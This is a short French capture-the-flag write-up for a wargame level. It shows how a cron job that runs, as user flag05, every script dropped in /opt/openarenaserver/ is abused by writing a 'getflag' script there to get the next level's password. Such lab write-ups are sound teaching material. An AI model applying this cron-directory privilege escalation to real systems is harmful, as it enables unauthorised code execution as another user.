# Rapport CTF - [level05]


### Observation:
Quand nous rentrons dans le niveau nous avons un message qui nous informe que nous avons un mail 
Nous allons donc essayer de les trouver avec la commande suivante: `find / -type d -name "mail" 2> /dev/null`

On trouve un exécutable à `/var/mail` qui se nomme `level05`

On comprend que c'est un exécutable qui exécute tout ce qu'il y a dans le fichier `openarenaserver`


### Code:
Nous ne pouvons pas l'exécuter, car nous n'avons pas les droits suffisants. \
Mais si on affiche sont contenu nous obtenons: 
```sh
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

Nous pouvons voir que c'est une commande cron tab qui est exécuté toutes les 2 min et qui lance le programme `/usr/sbin/openarenaserver`

Si maintenant, nous regardons `cat /usr/sbin/openarenaserver`: 
``` bash
#!/bin/sh

for i in /opt/openarenaserver/* ; do
(ulimit -t 5; bash -x "$i")
rm -f "$i"
done
```

Ce programme exécute tous les fichier qui se trouvent dans le dossier `/opt/openarenaserver/` puis les supprimes.


### Solution :
Nous devons donc créer un exécutable qui se trouve dans `/opt/openarenaserver/`, qui vas utiliser `getflag` et l'envoyer dans un fichier texte pour pouvoir lire le mot de passe de level06  
On ajoute le code suivant : `echo "getflag > /tmp/resultat.txt" > /opt/openarenaserver/test.sh`

Puis on attend que le script cron tab exécute `test.sh` toutes les 2 minutes.

Il ne nous reste plus qu'à afficher `/tmp/resultat.txt` pour obtenir le mot de passe de level06 sans passer par le flag05

